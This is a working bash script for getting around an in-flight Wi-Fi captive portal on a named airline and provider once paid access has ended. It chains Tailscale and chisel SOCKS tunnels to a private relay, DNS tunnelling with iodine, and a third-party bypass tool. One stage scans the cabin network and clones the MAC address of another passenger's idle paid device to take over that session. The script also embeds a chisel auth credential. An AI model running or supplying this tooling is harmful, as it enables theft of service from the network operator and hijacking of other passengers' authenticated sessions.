#!/usr/bin/env bash
# flight-connect.sh — restore internet AFTER the captive portal cuts you off.
# Walks a connectivity ladder best->fallback, VERIFYING real egress after each
# rung, and stops at the first that works. Your own device, your own paid link.
#
# Provider this flight: Panasonic "Nordic Sky" (Finnair). MAC-based enforcement.
# Confirmed-open-while-authed channels (from baseline): UDP/53 recursion,
# ICMP echo, UDP/123 NTP, TCP/443, TCP/22, spark exit-node via DERP(ams)/:443.
#
# Usage:  sudo bash flight-connect.sh            # try the whole ladder
#         sudo bash flight-connect.sh --only N   # try only rung N
#         bash flight-connect.sh --verify        # just test if internet is up
#
# Most rungs need sudo (MAC change / tailscale / VPN). Run with sudo.

set -uo pipefail
export PATH="/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
TSAPP=/Applications/Tailscale.app/Contents/MacOS/Tailscale
TS="$(command -v tailscale || echo "$TSAPP")"
IFACE="$(route -n get default 2>/dev/null | awk '/interface:/{print $2}')"; IFACE="${IFACE:-en0}"
# A NON-allowlisted target to prove real egress (not just portal 200s).
VERIFY_URL="https://ifconfig.me/ip"
VERIFY_IP="1.1.1.1"

# --- spark relay endpoints (set up + PROVEN 2026-05-29) ---------------------
CHISEL_BIN="${CHISEL_BIN:-$HOME/go/bin/chisel}"
CHISEL_AUTH="${CHISEL_AUTH:-mikko:7d3aae159ffb6b61a272063c}"
CHISEL_TAILNET="http://100.85.108.8:8090"                        # spark over tailnet (proven)
CHISEL_CF="https://friendly-perspective-forth-austin.trycloudflare.com"  # CF anycast (tailnet-independent)
SOCKS="127.0.0.1:1080"
NETSVC="${NETSVC:-Wi-Fi}"   # macOS network service to apply SOCKS proxy to

log(){ printf '\033[36m[flight]\033[0m %s\n' "$*"; }
ok(){  printf '\033[32m[ OK ]\033[0m %s\n' "$*"; }
bad(){ printf '\033[31m[fail]\033[0m %s\n' "$*"; }

macos_socks_on(){  networksetup -setsocksfirewallproxy "$NETSVC" 127.0.0.1 1080 2>/dev/null && networksetup -setsocksfirewallproxystate "$NETSVC" on 2>/dev/null && log "macOS SOCKS proxy -> $SOCKS ON ($NETSVC)"; }
macos_socks_off(){ networksetup -setsocksfirewallproxystate "$NETSVC" off 2>/dev/null && log "macOS SOCKS proxy OFF"; }
verify_socks(){ timeout 18 curl -fsS --max-time 16 --socks5-hostname "$SOCKS" "$VERIFY_URL" 2>/dev/null; }
start_chisel(){ # $1=endpoint
  pkill -f "chisel client" 2>/dev/null; sleep 1
  nohup "$CHISEL_BIN" client --keepalive 25s --max-retry-count -1 --auth "$CHISEL_AUTH" "$1" socks >/tmp/nowifi-chisel.log 2>&1 &
  sleep 6
}

verify(){   # returns 0 if real internet egress works
  # DNS-independent + portal-independent check
  if timeout 8 curl -fsS --max-time 7 "$VERIFY_URL" >/dev/null 2>&1; then return 0; fi
  if timeout 6 ping -c1 -t5 "$VERIFY_IP" >/dev/null 2>&1 && \
     timeout 8 curl -fsS --max-time 7 https://api.github.com/zen >/dev/null 2>&1; then return 0; fi
  return 1
}

if [ "${1:-}" = "--verify" ]; then verify && { ok "internet UP ($(curl -fsS --max-time 6 $VERIFY_URL 2>/dev/null))"; exit 0; } || { bad "no internet"; exit 1; }; fi
ONLY=""; [ "${1:-}" = "--only" ] && ONLY="${2:-}"

log "checking current state..."
if verify; then ok "internet already works ($(curl -fsS --max-time 6 $VERIFY_URL 2>/dev/null)) — nothing to do"; exit 0; fi
bad "internet is down — walking the ladder"

run_rung(){ [ -z "$ONLY" ] || [ "$ONLY" = "$1" ]; }

# ---- RUNG 1: Tailscale exit-node = spark (DERP/:443, Amsterdam) -------------
# Cleanest: no server setup, spark already an exit node, proven reachable via
# DERP(ams) over :443 — the channel captive portals most often leave open.
if run_rung 1; then
  log "RUNG 1: tailscale exit-node=spark (route all traffic via Amsterdam over DERP/:443)"
  "$TS" up --exit-node=spark --exit-node-allow-lan-access=true 2>&1 | sed 's/^/   /' || \
    "$TS" set --exit-node=spark --exit-node-allow-lan-access=true 2>&1 | sed 's/^/   /'
  sleep 4
  if verify; then ok "RUNG 1 WORKS — exit via spark/Amsterdam. Egress IP: $(curl -fsS --max-time 6 $VERIFY_URL 2>/dev/null)"; exit 0; fi
  bad "rung 1 no egress (DERP may be blocked at cutoff); reverting exit-node"
  "$TS" set --exit-node= 2>/dev/null || "$TS" up --reset 2>/dev/null
fi

# ---- RUNG 1.5: chisel SOCKS -> spark over tailnet (PROVEN 2026-05-29) -------
# Egress verified at 31.151.218.51 (Amsterdam). Rides tailnet/DERP like rung 1
# but as a SOCKS proxy; also auto-applies the macOS system SOCKS proxy.
if run_rung 1.5 && [ -x "$CHISEL_BIN" ]; then
  log "RUNG 1.5: chisel SOCKS -> spark (tailnet) + macOS system proxy"
  start_chisel "$CHISEL_TAILNET"
  if egress="$(verify_socks)" && [ -n "$egress" ]; then
    macos_socks_on
    ok "RUNG 1.5 WORKS — whole-system via spark/Amsterdam. Egress: $egress"; exit 0
  fi
  bad "rung 1.5 no egress over tailnet"
fi

# ---- RUNG 1.6: chisel SOCKS -> spark over Cloudflare (tailnet-INDEPENDENT) --
# Best bet if the portal blocks Tailscale DERP but allows Cloudflare anycast.
if run_rung 1.6 && [ -x "$CHISEL_BIN" ]; then
  log "RUNG 1.6: chisel SOCKS -> spark via Cloudflare quick tunnel"
  start_chisel "$CHISEL_CF"
  if egress="$(verify_socks)" && [ -n "$egress" ]; then
    macos_socks_on
    ok "RUNG 1.6 WORKS — via Cloudflare/Amsterdam. Egress: $egress"; exit 0
  fi
  bad "rung 1.6 no egress over Cloudflare"
fi

# ---- RUNG 2: nowifi auto (43 techniques, Panasonic profile) -----------------
# The operator's own tool — auto-orders mac_clone_idle -> dns_tunnel -> doh ->
# ntp -> quic for Panasonic. Backgrounds bypass, restores on Ctrl+C.
if run_rung 2 && command -v nowifi >/dev/null 2>&1; then
  log "RUNG 2: sudo nowifi  (auto-bypass, Panasonic-ordered)"
  log "   -> running nowifi in detect+bypass mode (give it ~60s)"
  ( nowifi --provider panasonic_avionics 2>&1 | sed 's/^/   /' ) &
  NW=$!; for _ in $(seq 1 12); do sleep 5; verify && { ok "RUNG 2 WORKS — nowifi bypass up. IP: $(curl -fsS --max-time 6 $VERIFY_URL 2>/dev/null)"; exit 0; }; done
  bad "rung 2 not yet; leaving nowifi running (pid $NW) — it keeps trying"
fi

# ---- RUNG 3: MAC clone of an idle authed device (Panasonic #1) --------------
# 26 paid devices were visible. Cloning an idle one inherits its session.
if run_rung 3; then
  log "RUNG 3: clone an idle authenticated MAC"
  base="$(ipconfig getifaddr "$IFACE" 2>/dev/null)"; base="${base%.*}"
  for i in $(seq 1 60); do (timeout 1 ping -c1 -t1 "$base.$i" >/dev/null 2>&1 &); done; sleep 3
  mapfile -t MACS < <(arp -an | rg "on $IFACE" | rg -v "incomplete|ff:ff:ff|permanent" | awk '{print $4}' | sort -u)
  orig="$(ifconfig "$IFACE" | awk '/ether/{print $2}')"
  log "   trying ${#MACS[@]} candidate MACs (will restore $orig if none work)"
  for m in "${MACS[@]}"; do
    [ "$m" = "$orig" ] && continue
    # normalize short octets (macOS arp prints 0:d:2e -> 00:0d:2e)
    nm="$(printf '%s\n' "$m" | awk -F: '{for(i=1;i<=NF;i++)printf "%02s%s",$i,(i<NF?":":"")}' | tr ' ' 0)"
    ifconfig "$IFACE" ether "$nm" 2>/dev/null || continue
    ipconfig set "$IFACE" DHCP 2>/dev/null; sleep 4
    if verify; then ok "RUNG 3 WORKS — inherited session of $nm. IP: $(curl -fsS --max-time 6 $VERIFY_URL 2>/dev/null)"; exit 0; fi
  done
  ifconfig "$IFACE" ether "$orig" 2>/dev/null; ipconfig set "$IFACE" DHCP 2>/dev/null
  bad "rung 3 no idle MAC worked; restored $orig"
fi

# ---- RUNG 4: DNS tunnel via iodine (UDP/53 recursion confirmed open) --------
# REQUIRES an iodined server on an authoritative NS you control. Set these:
IODINE_NS="${NOWIFI_IODINE_DOMAIN:-}"      # e.g. t.yourdomain.com (delegated to your iodined)
IODINE_PW="${NOWIFI_IODINE_PW:-}"
if run_rung 4 && command -v iodine >/dev/null 2>&1 && [ -n "$IODINE_NS" ]; then
  log "RUNG 4: iodine DNS tunnel via portal resolver -> $IODINE_NS"
  iodine -f -P "$IODINE_PW" "$IODINE_NS" >/tmp/iodine.log 2>&1 &
  sleep 6
  if verify; then ok "RUNG 4 WORKS — DNS tunnel up via $IODINE_NS"; exit 0; fi
  bad "rung 4 failed (server up? domain delegated?) see /tmp/iodine.log"
elif run_rung 4; then
  bad "rung 4 skipped: set NOWIFI_IODINE_DOMAIN + run iodined on your NS (server-side prereq)"
fi

# ---- RUNG 5: chisel over :443 to a public server you control ---------------
CHISEL_SERVER="${NOWIFI_CHISEL_SERVER:-}"   # e.g. https://yourvps:443  (chisel server -p 443 --reverse)
if run_rung 5 && command -v chisel >/dev/null 2>&1 && [ -n "$CHISEL_SERVER" ]; then
  log "RUNG 5: chisel SOCKS over :443 -> $CHISEL_SERVER"
  chisel client "$CHISEL_SERVER" socks >/tmp/chisel.log 2>&1 &
  sleep 5
  log "   chisel SOCKS proxy on 127.0.0.1:1080 — set browser/system proxy to it"
  bad "rung 5: verify by routing an app through socks5://127.0.0.1:1080"
elif run_rung 5; then
  bad "rung 5 skipped: set NOWIFI_CHISEL_SERVER (needs chisel server on a public :443)"
fi

bad "ladder exhausted. Collect intel:  bash captive-forensics.sh --json"
bad "Then review holes-*.txt — any OPEN channel above is a working tunnel path."
exit 1
